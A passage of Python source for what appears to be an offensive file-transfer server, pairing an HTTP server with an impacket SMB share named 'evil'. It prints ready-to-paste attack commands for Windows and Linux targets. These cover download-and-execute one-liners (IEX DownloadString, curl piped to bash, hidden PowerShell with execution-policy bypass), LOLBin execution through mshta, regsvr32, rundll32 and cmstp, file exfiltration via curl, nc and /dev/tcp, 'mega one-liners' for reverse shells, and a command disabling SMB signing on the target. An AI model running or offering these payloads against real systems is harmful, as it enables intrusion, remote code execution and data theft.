            # ── SHARE ────────────────────────────────────────────────────────
            elif 'Connecting Share' in text:
                conn_had_share = True
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.CYAN}[SMB] [SHARE]{C.RESET} {text}")

            # ── FILE OPS ─────────────────────────────────────────────────────
            elif 'SMB2_CREATE' in text or 'NTCreateAndX' in text:
                conn_had_file = True
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.CYAN}[SMB] [CREATE]{C.RESET} {text}")

            elif any(x in text for x in ['SMB2_READ', 'ReadAndX', 'read(']):
                conn_had_file = True
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.CYAN}[SMB] [READ]{C.RESET} {text}")

            elif any(x in text for x in ['SMB2_WRITE', 'WriteAndX', 'write(']):
                conn_had_file = True
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.BLUE}[SMB] [WRITE]{C.RESET} {text}")

            elif any(x in text.lower() for x in ['open(', 'create(', '.php', '.exe', '.ps1', '.bat', '.txt', '.dll']):
                conn_had_file = True
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.CYAN}{C.BOLD}[SMB] [FILE]{C.RESET} {C.CYAN}{text}{C.RESET}")

            # ── DISC — run all pattern checks ────────────────────────────────
            elif 'Closing down connection' in text:
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.YELLOW}[SMB] [DISC]{C.RESET} {text}")

                if not conn_had_auth:
                    # CONN → DISC with no auth at all
                    warn(ts, f"No AUTH before disconnect ({conn_ip}) — port scan or bare TCP probe")

                elif conn_had_auth and not conn_had_share:
                    # CONN → AUTH → DISC (signing rejection)
                    warn(ts, "AUTH but no SHARE — likely SMB signing rejection")
                    if smb_signing:
                        warn(ts, "Run on target (admin required):")
                        print(f"{C.GRAY}[{ts}]{C.RESET} {C.WHITE}        Set-SmbClientConfiguration -RequireSecuritySignature $false -Force{C.RESET}")
                    else:
                        warn(ts, "Restart with: tools -dir -smb -smb-signing")

                elif conn_had_auth and conn_had_share and not conn_had_file:
                    # CONN → AUTH → SHARE → DISC (enumeration, no transfer)
                    warn(ts, f"SHARE accessed but no file ops ({conn_ip}) — likely enumeration (net view / dir)")

                elif conn_had_auth and conn_had_share and conn_had_file:
                    # CONN → AUTH → SHARE → FILE → DISC (transfer attempt)
                    # Can't confirm completion over SMB the way HTTP can — flag as attempt
                    print(f"{C.GRAY}[{ts}]{C.RESET} {C.GREEN}[SMB] [XFER]{C.RESET} Transfer attempt completed for {conn_ip}")

                # Reset per-connection state
                conn_ip          = None
                conn_had_auth    = False
                conn_had_share   = False
                conn_had_file    = False
                conn_authed_user = None

            elif text.startswith('[*]') or text.startswith('[+]') or text.startswith('[-]'):
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.GRAY}[SMB]{C.RESET} {text}")

            sys.stdout.flush()
    except:
        pass


def start_smb_server(share_path, smb_port=445, share_name="evil", 
                     username=None, password=None, smb2support=True,
                     smb_signing=False, primary_ip=None):
    """Start SMB server using impacket-smbserver CLI (more reliable than API)"""
    
    # Check if impacket-smbserver is available
    smbserver_path = shutil.which('impacket-smbserver')
    if not smbserver_path:
        print(f"{C.RED}[-] impacket-smbserver not found. Install: sudo apt install python3-impacket{C.RESET}")
        return None
    
    try:
        # Kill any existing impacket-smbserver on this port
        try:
            # Find and kill processes using the SMB port
            result = subprocess.run(
                ['fuser', '-k', f'{smb_port}/tcp'],
                capture_output=True,
                timeout=3
            )
            if result.returncode == 0:
                print(f"{C.YELLOW}[*] Killed existing process on port {smb_port}{C.RESET}")
                time.sleep(0.5)  # Give it time to release the port
        except:
            pass
        
        # Also try to kill any impacket-smbserver processes
        try:
            subprocess.run(['pkill', '-f', 'impacket-smbserver'], capture_output=True, timeout=2)
            time.sleep(0.3)
        except:
            pass
        
        # Build command with unbuffered output
        # Try stdbuf for line buffering, fall back to direct if not available
        base_cmd = ['impacket-smbserver', share_name, share_path, '-port', str(smb_port), '-debug']
        
        if smb2support:
            base_cmd.append('-smb2support')
        
        if username and password:
            base_cmd.extend(['-username', username, '-password', password])
        
        # Use stdbuf to force line buffering (helps with Python subprocess output)
        if shutil.which('stdbuf'):
            cmd = ['stdbuf', '-oL', '-eL'] + base_cmd
        else:
            cmd = base_cmd
        
        # Set environment to unbuffer Python output
        env = os.environ.copy()
        env['PYTHONUNBUFFERED'] = '1'
        
        # Start as subprocess with TEXT mode for proper line reading
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            env=env
        )
        
        # Start a thread to read and display SMB output
        reader_thread = threading.Thread(
            target=smb_output_reader,
            args=(proc, smb_signing, username, primary_ip),
            daemon=True
        )
        reader_thread.start()
        
        # Give it a moment to start
        time.sleep(0.5)
        
        # Check if it's still running
        if proc.poll() is not None:
            print(f"{C.RED}[-] SMB server failed to start (exit code: {proc.returncode}){C.RESET}")
            return None
        
        return proc
        
    except PermissionError:
        print(f"{C.RED}[-] SMB port {smb_port} requires root. Try: sudo or use -sp <port> (e.g., -sp 4445){C.RESET}")
        return None
    except Exception as e:
        print(f"{C.RED}[-] SMB server error: {e}{C.RESET}")
        return None


def get_all_ips():
    ips = {}
    interfaces = ['tun0', 'tap0', 'eth0', 'ens33', 'ens160', 'wlan0']
    
    for iface in interfaces:
        try:
            result = subprocess.run(
                ['ip', '-4', 'addr', 'show', iface],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    ip = line.strip().split()[1].split('/')[0]
                    ips[iface] = ip
                    break
        except:
            pass
    
    return ips


def run_server(port, download_dir, upload_dir, smb_enabled=False, smb_port=445, 
               smb_share="evil", smb_user=None, smb_pass=None, smb2support=True,
               smb_signing=False):
    os.chdir(download_dir)
    DualHandler.upload_dir = upload_dir
    DualHandler.download_dir = download_dir
    
    ips = get_all_ips()
    primary_ip = ips.get('tun0') or ips.get('tap0') or list(ips.values())[0] if ips else '127.0.0.1'
    
    DualHandler.server_ip = primary_ip
    DualHandler.server_port = port
    
    iface_display = " | ".join([f"{k}: {C.GREEN}{v}{C.RESET}" for k, v in ips.items()])
    base_url = f"http://{primary_ip}:{port}"
    
    # Check if SMB should take over HTTP port (SMB-only mode)
    smb_only_mode = smb_enabled and smb_port == port
    
    # Start HTTP server (unless SMB is taking this port)
    server = None
    http_status = f"{C.GREEN}{port}{C.RESET}"
    if smb_only_mode:
        http_status = f"{C.GRAY}Disabled (port {port} used by SMB){C.RESET}"
    else:
        server = HTTPServer(('0.0.0.0', port), DualHandler)
    
    # Start SMB server if enabled
    smb_server = None
    smb_status = f"{C.GRAY}Disabled (use -smb to enable){C.RESET}"
    
    if smb_enabled:
        smb_server = start_smb_server(
            download_dir, 
            smb_port=smb_port,
            share_name=smb_share,
            username=smb_user,
            password=smb_pass,
            smb2support=smb2support,
            smb_signing=smb_signing,
            primary_ip=primary_ip
        )
        if smb_server:
            auth_info = f"{smb_user}:{smb_pass}" if smb_user else "anonymous"
            smb2_info = f" | SMB2: {'ON' if smb2support else 'OFF'}"
            signing_info = f" | {C.RED}signing-bypass: ON{C.RESET}" if smb_signing else ""
            smb_status = f"{C.GREEN}Port {smb_port}{C.RESET} | Share: {C.CYAN}{smb_share.upper()}{C.RESET} | Auth: {C.YELLOW}{auth_info}{C.RESET}{smb2_info}{signing_info}"
        else:
            smb_status = f"{C.RED}Failed to start (check port/permissions){C.RESET}"
            if smb_only_mode:
                print(f"{C.RED}[-] SMB failed to start and HTTP is disabled. Exiting.{C.RESET}")
                sys.exit(1)
    
    # Build UNC path for SMB commands
    smb_unc_win = f"\\\\{primary_ip}\\{smb_share.upper()}" if smb_enabled else ""
    smb_unc_linux = f"//{primary_ip}/{smb_share.upper()}" if smb_enabled else ""
    
    # Build Windows commands block
    win_commands = ""
    if not smb_only_mode or smb_enabled:
        # Paste-once functions (with SMB fallback if enabled)
        if smb_enabled and not smb_only_mode:
            # Both HTTP and SMB available
            win_download_func = f'function download{{$args|%{{$f=$_;$o=Split-Path $f -Leaf;$u="{base_url}/$f";try{{curl.exe $u -so $o 2>$null;if(Test-Path $o){{return}}}}catch{{}};certutil -urlcache -split -f $u $o 2>$null|Out-Null;if($?){{return}};try{{copy {smb_unc_win}\\$f $o 2>$null;if(Test-Path $o){{return}}}}catch{{}};try{{iwr -uri $u -outfile $o -ea Stop}}catch{{}};Write-Host "[-] Failed: $f"}}}}'
            win_upload_func = f'function upload{{$args|%{{$f=$_;$u="{base_url}/$f";try{{curl.exe -X PUT $u --data-binary "@$f" 2>$null;if($?){{return}}}}catch{{}};try{{copy $f {smb_unc_win}\\ 2>$null;if($?){{return}}}}catch{{}};try{{iwr -Uri $u -Method PUT -InFile $f -ea Stop}}catch{{}};try{{(New-Object Net.WebClient).UploadFile($u,$f)}}catch{{Write-Host "[-] Failed: $f"}}}}}}'
        elif smb_only_mode:
            # SMB only
            win_download_func = f'function download{{$args|%{{$f=$_;$o=Split-Path $f -Leaf;try{{copy {smb_unc_win}\\$f $o}}catch{{Write-Host "[-] Failed: $f"}}}}}}'
            win_upload_func = f'function upload{{$args|%{{$f=$_;try{{copy $f {smb_unc_win}\\}}catch{{Write-Host "[-] Failed: $f"}}}}}}'
        else:
            # HTTP only
            win_download_func = f'function download{{$args|%{{$f=$_;$o=Split-Path $f -Leaf;$u="{base_url}/$f";try{{curl.exe $u -so $o 2>$null;if(Test-Path $o){{return}}}}catch{{}};certutil -urlcache -split -f $u $o 2>$null|Out-Null;if($?){{return}};try{{iwr -uri $u -outfile $o -ea Stop}}catch{{}};try{{wget $u -O $o -ea Stop}}catch{{Write-Host "[-] Failed: $f"}}}}}}'
            win_upload_func = f'function upload{{$args|%{{$f=$_;$u="{base_url}/$f";try{{curl.exe -X PUT $u --data-binary "@$f" 2>$null;if($?){{return}}}}catch{{}};try{{iwr -Uri $u -Method PUT -InFile $f -ea Stop}}catch{{}};try{{(New-Object Net.WebClient).UploadFile($u,$f)}}catch{{Write-Host "[-] Failed: $f"}}}}}}'
        
        win_exec_func = ""
        if not smb_only_mode:
            win_exec_func = f'\n{C.BOLD}{C.WHITE}function exec{C.RESET}($f){{$u="{base_url}/$f";try{{IEX(New-Object Net.WebClient).DownloadString($u)}}catch{{try{{IEX(iwr -uri $u -UseBasicParsing).Content}}catch{{try{{IEX(curl.exe -s $u)}}catch{{Write-Host "[-] Failed"}}}}}}}}'
        
        # Format with bold function names
        win_download_display = win_download_func.replace('function download', f'{C.BOLD}{C.WHITE}function download{C.RESET}')
        win_upload_display = win_upload_func.replace('function upload', f'{C.BOLD}{C.WHITE}function upload{C.RESET}')

        # ── Build raw (no ANSI) versions for the mega one-liner ──────────────
        # The mega one-liner is copy-paste ready — no color codes that break PS
        win_all_funcs_raw = win_download_func + '; ' + win_upload_func
        if not smb_only_mode:
            exec_func_raw = f'function exec($f){{$u="{base_url}/$f";try{{IEX(New-Object Net.WebClient).DownloadString($u)}}catch{{try{{IEX(iwr -uri $u -UseBasicParsing).Content}}catch{{try{{IEX(curl.exe -s $u)}}catch{{Write-Host "[-] Failed"}}}}}}}}'
            win_all_funcs_raw += '; ' + exec_func_raw

        win_commands = f"""
{C.YELLOW}════════════════════════════════════════════════════════════════════════════════{C.RESET}
{C.BOLD}{C.CYAN}# WINDOWS - POWERSHELL FUNCTIONS{C.RESET}
{C.GRAY}# Paste into current session. Use: download FILE / upload FILE / exec FILE.ps1{C.RESET}
{C.YELLOW}# ⚠  Functions lost in child powershell.exe — re-paste the MEGA ONE-LINER below{C.RESET}
{win_download_display}
{win_upload_display}{win_exec_func}
"""
        # One-liner cheatsheet (if HTTP enabled)
        if not smb_only_mode:
            win_commands += f"""
{C.YELLOW}────────────────────────────────────────────────────────────────────────────────{C.RESET}
{C.BOLD}{C.CYAN}# WINDOWS - DOWNLOAD (PowerShell){C.RESET}
{C.WHITE}iwr{C.RESET} -uri {base_url}/FILE -outfile FILE
{C.WHITE}(New-Object Net.WebClient).DownloadFile{C.RESET}('{base_url}/FILE','FILE')
{C.WHITE}Invoke-RestMethod{C.RESET} -uri {base_url}/FILE -OutFile FILE
{C.WHITE}Start-BitsTransfer{C.RESET} -Source {base_url}/FILE -Destination FILE
{C.WHITE}curl.exe{C.RESET} {base_url}/FILE -o FILE

{C.BOLD}{C.CYAN}# WINDOWS - DOWNLOAD (CMD){C.RESET}
{C.WHITE}certutil{C.RESET} -urlcache -split -f {base_url}/FILE FILE
{C.WHITE}bitsadmin{C.RESET} /transfer j {base_url}/FILE %cd%\\FILE
{C.WHITE}curl{C.RESET} {base_url}/FILE -o FILE

{C.BOLD}{C.CYAN}# WINDOWS - UPLOAD (PowerShell){C.RESET}
{C.WHITE}iwr{C.RESET} -Uri {base_url}/FILE -Method PUT -InFile FILE
{C.WHITE}(New-Object Net.WebClient).UploadFile{C.RESET}('{base_url}/FILE','FILE')
{C.WHITE}curl.exe{C.RESET} -X PUT {base_url}/FILE --data-binary "@FILE"
{C.WHITE}Invoke-RestMethod{C.RESET} -Uri {base_url}/FILE -Method PUT -InFile FILE
{C.WHITE}$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('FILE'));iwr -Uri {base_url}/FILE.b64 -Method PUT -Body $b{C.RESET}

{C.BOLD}{C.CYAN}# WINDOWS - UPLOAD (CMD){C.RESET}
{C.WHITE}curl{C.RESET} -X PUT {base_url}/FILE --data-binary @FILE
{C.WHITE}type FILE | curl{C.RESET} -X PUT {base_url}/FILE -d @-

{C.BOLD}{C.CYAN}# WINDOWS - EXEC (PowerShell){C.RESET}
{C.WHITE}IEX{C.RESET}(New-Object Net.WebClient).DownloadString('{base_url}/FILE.ps1')
{C.WHITE}IEX{C.RESET}(iwr -uri {base_url}/FILE.ps1 -UseBasicParsing).Content
{C.WHITE}IEX{C.RESET}(Invoke-RestMethod -uri {base_url}/FILE.ps1)
{C.WHITE}powershell{C.RESET} -c "IEX(New-Object Net.WebClient).DownloadString('{base_url}/FILE.ps1')"
{C.WHITE}powershell{C.RESET} -ep bypass -w hidden -c "IEX(iwr {base_url}/FILE.ps1 -UseBasicParsing)"

{C.BOLD}{C.CYAN}# WINDOWS - EXEC (LOLBins){C.RESET}
{C.WHITE}mshta{C.RESET} {base_url}/FILE.hta
{C.WHITE}rundll32{C.RESET} javascript:"\\..\\mshtml,RunHTMLApplication ";o=new%20ActiveXObject("WScript.Shell");o.Run("powershell -c IEX(iwr {base_url}/FILE.ps1)")
{C.WHITE}regsvr32{C.RESET} /s /n /u /i:{base_url}/FILE.sct scrobj.dll
{C.WHITE}msiexec{C.RESET} /q /i {base_url}/FILE.msi
{C.WHITE}cmstp{C.RESET} /ni /s FILE.inf {C.GRAY}# INF with shellcode{C.RESET}
"""
        # SMB commands (if SMB enabled)
        if smb_enabled and smb_server:
            smb_signing_block = ""
            if smb_signing:
                smb_signing_block = f"""
{C.RED}⚠  SMB SIGNING BYPASS — run this FIRST on the target (requires admin):{C.RESET}
{C.WHITE}Set-SmbClientConfiguration{C.RESET} -RequireSecuritySignature $false -Force
{C.GRAY}# Verify with: Get-SmbClientConfiguration | Select RequireSecuritySignature{C.RESET}
{C.GRAY}# Symptom: AUTH+HASH in log but no [SHARE] entry → signing rejection{C.RESET}
"""
            win_commands += f"""
{C.YELLOW}────────────────────────────────────────────────────────────────────────────────{C.RESET}
{C.BOLD}{C.CYAN}# WINDOWS - SMB{C.RESET}{smb_signing_block}
{C.WHITE}copy{C.RESET} {smb_unc_win}\\FILE .
{C.WHITE}copy{C.RESET} FILE {smb_unc_win}\\
{C.WHITE}xcopy{C.RESET} {smb_unc_win}\\* . /E /Y
{C.WHITE}net use{C.RESET} Z: {smb_unc_win}
{C.WHITE}pushd{C.RESET} {smb_unc_win}
{C.WHITE}Copy-Item{C.RESET} {smb_unc_win}\\FILE . {C.GRAY}# PowerShell{C.RESET}
{C.WHITE}Start-Process{C.RESET} {smb_unc_win}\\FILE.exe {C.GRAY}# Direct exec from share{C.RESET}
{C.WHITE}& {smb_unc_win}\\FILE.exe{C.RESET} {C.GRAY}# Direct exec from share{C.RESET}
"""
        
        # CMD section (backwards compat one-liners if http enabled)
        if not smb_only_mode:
            win_commands += f"""
{C.YELLOW}────────────────────────────────────────────────────────────────────────────────{C.RESET}
{C.BOLD}{C.CYAN}# WINDOWS - CMD ONE-LINERS{C.RESET}
{C.WHITE}curl{C.RESET} {base_url}/FILE -o FILE
{C.WHITE}certutil{C.RESET} -urlcache -split -f {base_url}/FILE FILE
{C.WHITE}bitsadmin{C.RESET} /transfer j {base_url}/FILE %cd%\\FILE
{C.WHITE}powershell{C.RESET} -c "(New-Object Net.WebClient).DownloadFile('{base_url}/FILE','FILE')"

{C.YELLOW}════════════════════════════════════════════════════════════════════════════════{C.RESET}
{C.BOLD}{C.RED}▶ WINDOWS MEGA ONE-LINER — paste into ANY new PowerShell session{C.RESET}
{C.GRAY}# Defines download + upload + exec in one shot. Works in fresh PS, child PS, WinRM, evil-winrm.{C.RESET}
{C.WHITE}{win_all_funcs_raw}{C.RESET}
"""
    
    # Build Linux commands block
    linux_commands = ""
    if not smb_only_mode or smb_enabled:
        # Paste-once functions (with SMB fallback if enabled)
        if smb_enabled and not smb_only_mode:
            # Both HTTP and SMB available
            linux_download_func = f'download(){{ for f in "$@"; do o=$(basename "$f"); curl {base_url}/$f -so "$o" || wget {base_url}/$f -qO "$o" || smbclient {smb_unc_linux} -N -c "get $f $o" 2>/dev/null || busybox wget {base_url}/$f -O "$o" || echo "[-] Failed: $f"; done; }}'
            linux_upload_func = f'upload(){{ for f in "$@"; do curl -X PUT {base_url}/"$f" --data-binary @"$f" || wget --post-file="$f" {base_url}/"$f" -qO- || smbclient {smb_unc_linux} -N -c "put $f" || cat "$f" | nc {primary_ip} {port} || echo "[-] Failed: $f"; done; }}'
        elif smb_only_mode:
            # SMB only
            linux_download_func = f'download(){{ for f in "$@"; do smbclient {smb_unc_linux} -N -c "get $f" || echo "[-] Failed: $f"; done; }}'
            linux_upload_func = f'upload(){{ for f in "$@"; do smbclient {smb_unc_linux} -N -c "put $f" || echo "[-] Failed: $f"; done; }}'
        else:
            # HTTP only
            linux_download_func = f'download(){{ for f in "$@"; do o=$(basename "$f"); curl {base_url}/$f -so "$o" || wget {base_url}/$f -qO "$o" || busybox wget {base_url}/$f -O "$o" || python3 -c "import urllib.request;urllib.request.urlretrieve(\'{base_url}/$f\',\'$o\')" || echo "[-] Failed: $f"; done; }}'
            linux_upload_func = f'upload(){{ for f in "$@"; do curl -X PUT {base_url}/"$f" --data-binary @"$f" || wget --post-file="$f" {base_url}/"$f" -qO- || curl -F "files=@$f" {base_url}/upload || cat "$f" | nc {primary_ip} {port} || echo "[-] Failed: $f"; done; }}'
        
        linux_exec_funcs = ""
        if not smb_only_mode:
            linux_exec_funcs = f"""
{C.BOLD}{C.WHITE}exec(){C.RESET}{{ curl -s {base_url}/$1 | bash -s -- "${{@:2}}" || wget -qO- {base_url}/$1 | bash -s -- "${{@:2}}" || echo "[-] Failed"; }}
{C.BOLD}{C.WHITE}execpy(){C.RESET}{{ curl -s {base_url}/$1 | python3 - "${{@:2}}" || wget -qO- {base_url}/$1 | python3 - "${{@:2}}" || echo "[-] Failed"; }}
{C.BOLD}{C.WHITE}execpl(){C.RESET}{{ curl -s {base_url}/$1 | perl - "${{@:2}}" || wget -qO- {base_url}/$1 | perl - "${{@:2}}" || echo "[-] Failed"; }}
{C.BOLD}{C.WHITE}execphp(){C.RESET}{{ curl -s {base_url}/$1 | php -- "${{@:2}}" || wget -qO- {base_url}/$1 | php -- "${{@:2}}" || echo "[-] Failed"; }}"""
        
        # Format function names with bold
        linux_download_display = linux_download_func.replace('download()', f'{C.BOLD}{C.WHITE}download(){C.RESET}')
        linux_upload_display = linux_upload_func.replace('upload()', f'{C.BOLD}{C.WHITE}upload(){C.RESET}')

        # Build raw exec functions for mega one-liner
        linux_exec_raw = ""
        if not smb_only_mode:
            linux_exec_raw = (
                f'; exec(){{ curl -s {base_url}/$1 | bash -s -- "${{@:2}}" || wget -qO- {base_url}/$1 | bash -s -- "${{@:2}}" || echo "[-] Failed"; }}'
                f'; execpy(){{ curl -s {base_url}/$1 | python3 - "${{@:2}}" || wget -qO- {base_url}/$1 | python3 - "${{@:2}}" || echo "[-] Failed"; }}'
                f'; execpl(){{ curl -s {base_url}/$1 | perl - "${{@:2}}" || wget -qO- {base_url}/$1 | perl - "${{@:2}}" || echo "[-] Failed"; }}'
            )
        linux_mega_oneliner = linux_download_func + '; ' + linux_upload_func + linux_exec_raw

        linux_commands = f"""
{C.YELLOW}════════════════════════════════════════════════════════════════════════════════{C.RESET}
{C.BOLD}{C.GREEN}# LINUX - FUNCTIONS{C.RESET}
{C.GRAY}# Paste once, use: download FILE / upload FILE / exec FILE.sh / execpy FILE.py{C.RESET}
{linux_download_display}
{linux_upload_display}{linux_exec_funcs}
"""
        # One-liner cheatsheet (if HTTP enabled)
        if not smb_only_mode:
            linux_commands += f"""
{C.YELLOW}────────────────────────────────────────────────────────────────────────────────{C.RESET}
{C.BOLD}{C.GREEN}# LINUX - DOWNLOAD{C.RESET}
{C.WHITE}curl{C.RESET} {base_url}/FILE -o FILE
{C.WHITE}wget{C.RESET} {base_url}/FILE -O FILE
{C.WHITE}python3{C.RESET} -c "import urllib.request;urllib.request.urlretrieve('{base_url}/FILE','FILE')"
{C.WHITE}php{C.RESET} -r "file_put_contents('FILE',file_get_contents('{base_url}/FILE'));"
{C.WHITE}ruby{C.RESET} -e "require'net/http';File.write('FILE',Net::HTTP.get(URI('{base_url}/FILE')))"
{C.WHITE}perl{C.RESET} -e "use LWP::Simple;getstore('{base_url}/FILE','FILE')"
{C.WHITE}nc{C.RESET} {primary_ip} {port} < /dev/null > FILE {C.GRAY}# Server: cat FILE | nc -lvp {port}{C.RESET}

{C.BOLD}{C.GREEN}# LINUX - UPLOAD{C.RESET}
{C.WHITE}curl{C.RESET} -X PUT {base_url}/FILE --data-binary @FILE
{C.WHITE}curl{C.RESET} -F "files=@FILE" {base_url}/upload
{C.WHITE}wget{C.RESET} --post-file=FILE {base_url}/FILE -qO-
{C.WHITE}python3{C.RESET} -c "import requests;requests.put('{base_url}/FILE',data=open('FILE','rb'))"
{C.WHITE}nc{C.RESET} {primary_ip} {port} < FILE {C.GRAY}# Server: nc -lvp {port} > FILE{C.RESET}
{C.WHITE}bash{C.RESET} -c "cat FILE > /dev/tcp/{primary_ip}/{port}" {C.GRAY}# Server: nc -lvp {port} > FILE{C.RESET}
{C.WHITE}base64{C.RESET} FILE | curl -X PUT {base_url}/FILE.b64 -d @- {C.GRAY}# Then: base64 -d FILE.b64{C.RESET}
{C.WHITE}tar{C.RESET} czf - FILE | curl -X PUT {base_url}/FILE.tar.gz --data-binary @-
{C.WHITE}php{C.RESET} -r "echo file_get_contents('FILE');" | curl -X PUT {base_url}/FILE -d @-

{C.BOLD}{C.GREEN}# LINUX - EXEC (download & execute){C.RESET}
{C.WHITE}curl{C.RESET} -s {base_url}/FILE.sh | bash
{C.WHITE}wget{C.RESET} -qO- {base_url}/FILE.sh | bash
{C.WHITE}curl{C.RESET} -s {base_url}/FILE.py | python3
{C.WHITE}wget{C.RESET} -qO- {base_url}/FILE.py | python3
{C.WHITE}curl{C.RESET} -s {base_url}/FILE.pl | perl
{C.WHITE}curl{C.RESET} -s {base_url}/FILE.php | php
{C.WHITE}curl{C.RESET} -s {base_url}/FILE.rb | ruby
{C.WHITE}python3{C.RESET} -c "import urllib.request;exec(urllib.request.urlopen('{base_url}/FILE.py').read())"
{C.WHITE}perl{C.RESET} -e "use LWP::Simple;eval(get('{base_url}/FILE.pl'))"
{C.WHITE}php{C.RESET} -r "eval(file_get_contents('{base_url}/FILE.php'));"

{C.YELLOW}════════════════════════════════════════════════════════════════════════════════{C.RESET}
{C.BOLD}{C.RED}▶ LINUX MEGA ONE-LINER — paste into ANY shell (bash/sh/zsh, new tty, reverse shell){C.RESET}
{C.GRAY}# Defines download + upload + exec in one shot. Works without sourcing a file.{C.RESET}
{C.WHITE}{linux_mega_oneliner}{C.RESET}
"""
        # SMB commands (if SMB enabled)
        if smb_enabled and smb_server:
            linux_commands += f"""
{C.YELLOW}────────────────────────────────────────────────────────────────────────────────{C.RESET}
{C.BOLD}{C.GREEN}# LINUX - SMB{C.RESET}
{C.WHITE}smbclient{C.RESET} {smb_unc_linux} -N -c 'get FILE'
{C.WHITE}smbclient{C.RESET} {smb_unc_linux} -N -c 'put FILE'
{C.WHITE}mount{C.RESET} -t cifs {smb_unc_linux} /mnt -o guest
{C.WHITE}cp{C.RESET} /mnt/FILE . {C.GRAY}# After mounting{C.RESET}
"""
    
    # Determine browse URL
    browse_line = f"  {C.WHITE}Browse:{C.RESET}    {C.UNDERLINE}{C.CYAN}{base_url}/files{C.RESET}" if not smb_only_mode else ""
    
    print(f"""
{C.BOLD}{C.YELLOW}╔══════════════════════════════════════════════════════════════════════════════╗
║                            FILE TRANSFER SERVER                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{C.RESET}
  {C.WHITE}HTTP:{C.RESET}      {http_status}
  {C.WHITE}SMB:{C.RESET}       {smb_status}
  {C.WHITE}Downloads:{C.RESET} {C.CYAN}{download_dir}{C.RESET}
  {C.WHITE}Uploads:{C.RESET}   {C.MAGENTA}{upload_dir}{C.RESET}
  {C.WHITE}IPs:{C.RESET}       {iface_display}
{browse_line}{win_commands}{linux_commands}
{C.YELLOW}════════════════════════════════════════════════════════════════════════════════{C.RESET}
""")
    
    # Get all files (shallow scan - 2 levels deep, max 500 files)
    MAX_DEPTH = 2
    MAX_FILES = 500
    
    # Skip indexing for system/dangerous directories
    skip_indexing_paths = ['/', '/usr', '/bin', '/sbin', '/lib', '/lib64', '/boot', '/dev', '/proc', '/sys', '/var', '/etc', '/root']
    should_skip = download_dir in skip_indexing_paths or any(download_dir.startswith(p + '/') for p in skip_indexing_paths)
    
    if should_skip:
        print(f"{C.YELLOW}File indexing disabled (system directory){C.RESET}")
        print(f"{C.GRAY}Server is running - you can still download files if you know the path{C.RESET}\n")
        files = []
        hit_limit = False
    else:
        files = get_all_files_recursive(download_dir, max_depth=MAX_DEPTH, max_files=MAX_FILES)
        hit_limit = len(files) >= MAX_FILES
        print_files_table(files, hit_limit=hit_limit)
    
    print(f"\n{C.YELLOW}════════════════════════════════════════════════════════════════════════════════{C.RESET}")
    print(f"{C.GREEN}[*] Server running - Press Ctrl+C to stop{C.RESET}\n")
    
    try:
        if server:
            # HTTP server running (with or without SMB)
            server.serve_forever()
        else:
            # SMB-only mode - keep process alive
            import signal
            signal.pause()
    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Shutting down...{C.RESET}")
        if server:
            server.shutdown()
        # Kill SMB server if running
        if smb_server:
            try:
                smb_server.terminate()
                smb_server.wait(timeout=2)
                print(f"{C.YELLOW}[*] SMB server terminated{C.RESET}")
            except:
                try:
                    smb_server.kill()
                    print(f"{C.YELLOW}[*] SMB server killed{C.RESET}")
                except:
                    pass
            # Also pkill any orphaned processes
            try:
                subprocess.run(['pkill', '-f', 'impacket-smbserver'], 
                             capture_output=True, timeout=2)
            except:
                pass
        print(f"{C.RED}[!] Server stopped{C.RESET}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='File Transfer Server with optional SMB support')
    parser.add_argument('-p', type=int, default=DEFAULT_PORT, metavar='PORT',
                        help=f'HTTP port (default: {DEFAULT_PORT})')
    parser.add_argument('-dir', nargs='?', const='.', default=None, metavar='PATH',
                        help='Download dir: -dir (current) or -dir /path')
    
    # SMB arguments
    parser.add_argument('-smb', action='store_true',
                        help='Enable SMB server (requires impacket)')
    parser.add_argument('-sp', type=int, default=DEFAULT_SMB_PORT, metavar='PORT',
                        help=f'SMB port (default: {DEFAULT_SMB_PORT})')
    parser.add_argument('-smbshare', type=str, default=DEFAULT_SMB_SHARE, metavar='NAME',
                        help=f'SMB share name (default: {DEFAULT_SMB_SHARE})')
    parser.add_argument('-smbuser', type=str, default=None, metavar='USER',
                        help='SMB username (default: anonymous)')
    parser.add_argument('-smbpass', type=str, default=None, metavar='PASS',
                        help='SMB password (requires -smbuser)')
    parser.add_argument('-no-smb2', action='store_true', dest='no_smb2',
                        help='Disable SMB2 (SMB2 is ON by default)')
    parser.add_argument('-smb-signing', action='store_true', dest='smb_signing',
                        help='Show SMB signing bypass commands (for Win Server 2022+ / patched Win11)')
    
    args = parser.parse_args()
    
    if args.dir is None:
        download_dir = DEFAULT_DOWNLOAD_DIR
    elif args.dir == '.':
        download_dir = os.getcwd()
    else:
        download_dir = args.dir
    
    upload_dir = os.getcwd()
    
    if not os.path.isdir(download_dir):
        print(f"{C.RED}[-] Download directory not found: {download_dir}{C.RESET}")
        sys.exit(1)
    
    # Validate SMB auth options
    if args.smbpass and not args.smbuser:
        print(f"{C.YELLOW}[!] -smbpass requires -smbuser. Ignoring password.{C.RESET}")
        args.smbpass = None
    
    run_server(
        args.p, 
        os.path.abspath(download_dir), 
        os.path.abspath(upload_dir),
        smb_enabled=args.smb,
        smb_port=args.sp,
        smb_share=args.smbshare,
        smb_user=args.smbuser,
        smb_pass=args.smbpass,
        smb2support=not args.no_smb2,
        smb_signing=args.smb_signing
    )
